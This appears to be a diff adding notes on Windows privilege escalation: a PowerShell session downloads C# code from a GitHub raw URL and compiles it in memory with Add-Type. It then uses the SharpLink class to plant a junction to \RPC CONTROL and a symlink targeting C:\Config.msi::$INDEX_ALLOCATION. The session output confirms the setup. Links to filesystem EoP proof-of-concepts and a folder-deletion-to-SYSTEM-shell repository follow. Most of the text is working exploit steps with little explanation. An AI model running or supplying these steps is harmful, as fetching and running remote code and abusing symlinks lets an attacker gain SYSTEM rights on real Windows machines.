@@ -1,3 +1,22 @@
+
+PS C:\Users\saila> $code = (iwr https://raw.githubusercontent.com/sailay1996/awesome_windows_logical_bugs/master/sharviewmodified.txt).content
+PS C:\Users\saila> Add-Type $code
+PS C:\Users\saila> $s = New-Object de.usd.SharpLink.Symlink("C:\EOP\hello\abc.txt", "C:\Config.msi`:`:`$INDEX_ALLOCATION")
+PS C:\Users\saila> $s.Status()
+[+] Link type: File system symbolic link
+[+]     Link path: C:\EOP\hello\abc.txt
+[+]     Target path: C:\Config.msi::$INDEX_ALLOCATION
+[+]     Associated Junction: none
+[+]     Associated DosDevice: none
+PS C:\Users\saila> $s.Open()
+[+] Creating Junction: C:\EOP\hello -> \RPC CONTROL
+[+] Creating DosDevice: Global\GLOBALROOT\RPC CONTROL\abc.txt -> \??\C:\Config.msi::$INDEX_ALLOCATION
+[+] Symlink setup successfully.
+PS C:\Users\saila> $s.Close()
+[+] Removing Junction: C:\EOP\hello
+[+] Deleting DosDevice: Global\GLOBALROOT\RPC CONTROL\abc.txt -> \??\C:\Config.msi::$INDEX_ALLOCATION
+[+] Symlink deleted.
+
 https://github.com/thezdi/PoC/tree/master/FilesystemEoPs
 
 https://github.com/bugzzzhunter/Folder-Deletion-to-System-Shell
